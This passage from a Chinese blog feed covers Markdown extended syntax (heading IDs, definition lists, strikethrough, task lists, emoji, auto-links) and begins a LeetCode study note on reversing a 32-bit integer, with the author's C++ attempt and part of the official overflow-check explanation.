class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="链接到标题ID-headid">链接到标题ID (#headid)</h3><p>通过创建带有数字符号（<code>#</code>）和自定义标题ID的[标准链接]((/basic-syntax/links.html)，可以链接到文件中具有自定义ID的标题。</p><table><thead><tr><th>Markdown</th><th>HTML</th><th>预览效果</th></tr></thead><tbody><tr><td><code>[标题编号](#标题编号)</code></td><td><code>&lt;a href=&quot;#标题编号&quot;&gt;标题编号&lt;/a&gt;</code></td><td><a href="https://www.h-t-m.top/posts/93ad49f7/#h%E6%A0%87%E9%A2%98%E7%BC%96%E5%8F%B7">标题编号</a></td></tr></tbody></table><p>其他网站可以通过将自定义标题ID添加到网页的完整URL（例如<code>[Heading IDs](https://markdown.com.cn/extended-syntax/heading-ids.html#headid)</code>）来链接到标题。</p><h2 id="定义列表">定义列表</h2><h3 id="定义列表语法">定义列表语法</h3><p>一些Markdown处理器允许您创建术语及其对应定义的<em>定义列表</em>。要创建定义列表，请在第一行上键入术语。在下一行，键入一个冒号，后跟一个空格和定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">First Term</span><br><span class="line">: This is the definition of the first term.</span><br><span class="line"></span><br><span class="line">Second Term</span><br><span class="line">: This is one definition of the second term.</span><br><span class="line">: This is another definition of the second term.</span><br></pre></td></tr></table></figure><p>HTML看起来像这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span>First Term<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span>This is the definition of the first term.<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Second Term<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span>This is one definition of the second term. <span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span>This is another definition of the second term.<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><p>First Term<br>: This is the definition of the first term.</p><p>Second Term<br>: This is one definition of the second term.<br>: This is another definition of the second term.</p><h2 id="删除线">删除线</h2><h3 id="删除线语法">删除线语法</h3><p>您可以通过在单词中心放置一条水平线来删除单词。结果看起来像这样。此功能使您可以指示某些单词是一个错误，要从文档中删除。若要删除单词，请在单词前后使用两个波浪号<code>~~</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~世界是平坦的~~。 我们现在知道世界是圆的。</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><p><s>世界是平坦的</s>。 我们现在知道世界是圆的。</p><h2 id="任务列表">任务列表</h2><h3 id="任务列表语法">任务列表语法</h3><p>任务列表使您可以创建带有复选框的项目列表。在支持任务列表的Markdown应用程序中，复选框将显示在内容旁边。要创建任务列表，请在任务列表项之前添加破折号<code>-</code>和方括号<code>[ ]</code>，并在<code>[ ]</code>前面加上空格。要选择一个复选框，请在方括号<code>[x]</code>之间添加 x 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- [x] Write the press release</span><br><span class="line">- [ ] Update the website</span><br><span class="line">- [ ] Contact the media</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><ul><li>[x] Write the press release</li><li>[ ] Update the website</li><li>[ ] Contact the media</li></ul><h2 id="Emoji">Emoji</h2><p>有两种方法可以将表情符号添加到Markdown文件中：将表情符号复制并粘贴到Markdown格式的文本中，或者键入<em>emoji shortcodes</em>。</p><h3 id="复制和粘贴表情符号">复制和粘贴表情符号</h3><p>在大多数情况下，您可以简单地从<a href="https://emojipedia.org/">Emojipedia</a> 等来源复制表情符号并将其粘贴到文档中。许多Markdown应用程序会自动以Markdown格式的文本显示表情符号。从Markdown应用程序导出的HTML和PDF文件应显示表情符号。</p><p><strong>Tip:</strong> 如果您使用的是静态网站生成器，请确保将HTML页面编码为UTF-8。.</p><h3 id="使用表情符号简码">使用表情符号简码</h3><p>一些Markdown应用程序允许您通过键入表情符号短代码来插入表情符号。这些以冒号开头和结尾，并包含表情符号的名称。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">去露营了！ :tent: 很快回来。</span><br><span class="line"></span><br><span class="line">真好笑！ :joy:</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><p>去露营了！⛺很快回来。</p><p>真好笑！😂</p><p><strong>Note:</strong> 注意：您可以使用此<a href="https://gist.github.com/rxaviers/7360908">表情符号简码列表</a>，但请记住，表情符号简码因应用程序而异。有关更多信息，请参阅Markdown应用程序的文档。</p><h2 id="自动网址链接">自动网址链接</h2><h3 id="自动网址链接语法">自动网址链接语法</h3><p>许多Markdown处理器会自动将URL转换为链接。这意味着如果您输入http://www.example.com，即使您未使用方括号，您的Markdown处理器也会自动将其转换为链接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><p><a href="http://www.example.com">http://www.example.com</a></p><p>如果您不希望自动链接URL，则可以通过将URL表示为带反引号的代码来删除该链接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`http://www.example.com`</span><br></pre></td></tr></table></figure><p>呈现的输出如下所示：</p><p><a href="http://www.example.com">http://www.example.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 官方文档 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 6</title>
      <link href="/posts/23090de5/"/>
      <url>/posts/23090de5/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——day 6</h1><h2 id="7-整数反转"><a href="https://leetcode-cn.com/problems/reverse-integer/">7. 整数反转</a></h2><p>难度：简单</p><p>给你一个 32 位的有符号整数 <code>x</code> ，返回将 <code>x</code> 中的数字部分反转后的结果。</p><p>如果反转后整数超过 32 位的有符号整数的范围 <code>[−231, 231 − 1]</code> ，就返回 0。</p><p><strong>假设环境不允许存储 64 位整数（有符号或无符号）。</strong></p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = -123</span><br><span class="line">输出：-321</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 120</span><br><span class="line">输出：21</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 0</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>-231 &lt;= x &lt;= 231 - 1</code></li></ul><h3 id="我的答案-6">我的答案</h3><blockquote><p><strong>思路</strong></p><p>先取 x 的绝对值，创建一个较大的 long 类型变量 n，从 x 的个位开始遍历每一位数字并依次赋给 n，此外还要考虑每个整数的范围问题。看完题解才注意到题目：<strong>假设环境不允许存储 64 位整数（有符号或无符号）。</strong></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> notion = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">long</span> x0 = x;</span><br><span class="line">        <span class="keyword">if</span>(x0 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            x0 = -x0;</span><br><span class="line">            notion = !notion;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; x0 &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">            n *= <span class="number">10</span>;</span><br><span class="line">            n += x0 % <span class="number">10</span>;</span><br><span class="line">            x0 /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        n = notion ? n : -n;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n &gt; INT_MAX || n &lt; INT_MIN) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>0 ms</strong></p></li><li><p>内存消耗: <strong>5.8 MB</strong></p></li></ul><p>一直考虑不全面，考虑了 n 的范围，却很容易忽略 x 取绝对值后的范围，而且审题不清楚，导致方法从一开始就是错的，虽然可以通过力扣的测试用例。</p><h3 id="官方答案-7">官方答案</h3><h4 id="数学">数学</h4><blockquote><p><strong>思路</strong></p><p>记 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext></mrow><annotation encoding="application/x-tex">\textit{rev}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord text"><span class="mord textit">rev</span></span></span></span></span> 为翻转后的数字，为完成翻转，我们可以重复「弹出」<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的末尾数字，将其「推入」<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext></mrow><annotation encoding="application/x-tex">\textit{rev}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord text"><span class="mord textit">rev</span></span></span></span></span> 的末尾，直至 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p>要在没有辅助栈或数组的帮助下「弹出」和「推入」数字，我们可以使用如下数学方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 弹出 x 的末尾数字 digit</span><br><span class="line">digit = x % 10</span><br><span class="line">x /= 10</span><br><span class="line"></span><br><span class="line">// 将数字 digit 推入 rev 末尾</span><br><span class="line">rev = rev * 10 + digit</span><br></pre></td></tr></table></figure><p>题目需要判断反转后的数字是否超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn></mrow><annotation encoding="application/x-tex">32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span> 位有符号整数的范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31},2^{31}-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>，例如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>2123456789</mn></mrow><annotation encoding="application/x-tex">x=2123456789</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2123456789</span></span></span></span> 反转后的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>=</mo><mn>9876543212</mn><mo>&gt;</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo>=</mo><mn>2147483647</mn></mrow><annotation encoding="application/x-tex">\textit{rev}=9876543212&gt;2^{31}-1=2147483647</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">9876543212</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2147483647</span></span></span></span>，超过了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn></mrow><annotation encoding="application/x-tex">32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span> 位有符号整数的范围。</p><p>因此我们需要在「推入」数字之前，判断是否满足</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo>≤</mo><mtext mathvariant="italic">rev</mtext><mo>⋅</mo><mn>10</mn><mo>+</mo><mtext mathvariant="italic">digit</mtext><mo>≤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-2^{31}\le\textit{rev}\cdot10+\textit{digit}\le2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>若该不等式不成立则返回 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p>但是题目要求不允许使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>64</mn></mrow><annotation encoding="application/x-tex">64</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">64</span></span></span></span> 位整数，即运算过程中的数字必须在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn></mrow><annotation encoding="application/x-tex">32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span> 位有符号整数的范围内，因此我们不能直接按照上述式子计算，需要另寻他路。</p><p>考虑 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的情况，记 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">INT_MAX</mtext><mo>=</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo>=</mo><mn>2147483647</mn></mrow><annotation encoding="application/x-tex">\textit{INT\_MAX}=2^{31}-1=2147483647</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord textit">INT_MAX</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2147483647</span></span></span></span>，由于</p><p><img src="long.svg" alt=""></p><p>则不等式</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>⋅</mo><mn>10</mn><mo>+</mo><mtext mathvariant="italic">digit</mtext><mo>≤</mo><mtext mathvariant="italic">INT_MAX</mtext></mrow><annotation encoding="application/x-tex">\textit{rev}\cdot10+\textit{digit}\le\textit{INT\_MAX}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span></p><p>等价于</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">rev</mtext><mo>⋅</mo><mn>10</mn><mo>+</mo><mtext mathvariant="italic">digit</mtext><mo>≤</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo><mo>⋅</mo><mn>10</mn><mo>+</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">\textit{rev}\cdot10+\textit{digit}\le\lfloor\dfrac{\textit{INT\_MAX}}{10}\rfloor\cdot10+7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord textit">digit</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0693em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3833em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.7em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span></p><p>移项得</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mtext mathvariant="italic">rev</mtext><mo>−</mo><mo stretchy="false">⌊</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mtext mathvariant="italic">INT_MAX</mtext><mn>10</mn></mfrac></mstyle><mo stretchy="false">⌋</mo><mo stretchy="false">)</mo><mo>⋅</mo><mn>10</mn><mo>≤</mo><mn>7</mn><mo>−</mo><mtext mathvariant="italic">digit</mtext></mrow><annotation encoding="application/x-tex">(\textit{rev}-\lfloor\dfrac{\textit{INT\_MAX}}{10}\rfloor)\cdot10\le7-\textit{digit}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord text"><span class="mord textit">rev</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.0693em;vertical-align:-0.686em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3833em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">10</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.7em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textit">INT_MAX</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2778em;"></span><span 